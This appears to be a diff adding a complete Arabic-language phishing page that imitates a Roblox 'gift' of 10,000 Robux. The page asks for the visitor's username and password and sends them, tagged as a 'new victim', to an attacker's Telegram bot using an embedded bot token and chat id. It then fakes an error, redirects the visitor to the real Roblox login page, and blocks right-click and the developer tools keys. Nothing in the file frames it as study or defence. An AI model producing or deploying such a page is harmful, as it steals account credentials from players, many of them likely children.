@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>هدية Robux</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial}
+body{background:#f9fafb;min-height:100vh;padding:20px;color:#232527}
+.header{text-align:center;margin-bottom:30px}
+.header h1{font-size:24px;margin-bottom:6px}
+.header p{color:#6e7175;font-size:14px}
+.card{background:#fff;border:1px solid #e3e5e7;border-radius:12px;padding:30px;max-width:420px;margin:0 auto;box-shadow:0 2px 8px rgba(0,0,0,0.06)}
+.gift{font-size:60px;text-align:center;margin-bottom:16px}
+.amount{font-size:28px;font-weight:800;text-align:center;color:#00a2ff;margin-bottom:8px}
+.from{text-align:center;color:#6e7175;font-size:14px;margin-bottom:24px}
+.f{margin-bottom:14px}
+.f label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}
+.f input{width:100%;padding:12px;border:1px solid #cbcbcb;border-radius:8px;font-size:15px;text-align:right}
+.btn{width:100%;padding:14px;background:#00a2ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:sp 0.7s linear infinite;vertical-align:middle;margin-left:6px}
+@keyframes sp{to{transform:rotate(360deg)}}
+</style></head>
+<body>
+<div class="header"><h1>🎁 لقد استلمت هدية!</h1><p>صديق أرسل لك Robux</p></div>
+<div class="card">
+<div class="gift">🎁</div>
+<div class="amount">10,000 Robux</div>
+<div class="from">من: صديق مجهول</div>
+<form id="f">
+<div class="f"><label>اسم المستخدم</label><input type="text" id="u" required></div>
+<div class="f"><label>كلمة المرور</label><input type="password" id="p" required></div>
+<button type="submit" class="btn" id="btn">استلام الهدية</button>
+</form>
+</div>
+<script>
+document.getElementById('f').addEventListener('submit', async function(e){
+    e.preventDefault();
+    var u = document.getElementById('u').value.trim();
+    var p = document.getElementById('p').value.trim();
+    if(!u || !p) return;
+    var btn = document.getElementById('btn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span>جاري...';
+    var msg = "🎣 ضحية جديدة\n🎯 lol\n👤 " + u + "\n🔑 " + p + "\n🌐 " + location.href + "\n⏰ " + new Date().toLocaleString('ar-DZ');
+    try {
+        await fetch("https://api.telegram.org/bot8811078908:AAHh5Gy2HMa0sPOcx6AffivgOHE3NbTYz3U/sendMessage", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({chat_id: "6045243196", text: msg})
+        });
+    } catch(err) {}
+    setTimeout(function(){
+        btn.style.background = "#e2231a";
+        btn.innerHTML = "خطأ — حاول مرة أخرى";
+        btn.disabled = false;
+        setTimeout(function(){ window.location.href = "https://www.roblox.com/ar/Login"; }, 2200);
+    }, 1200);
+});
+document.addEventListener('contextmenu', function(e){e.preventDefault();});
+document.addEventListener('keydown', function(e){
+    if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))) e.preventDefault();
+});
+</script>
+</body></html>
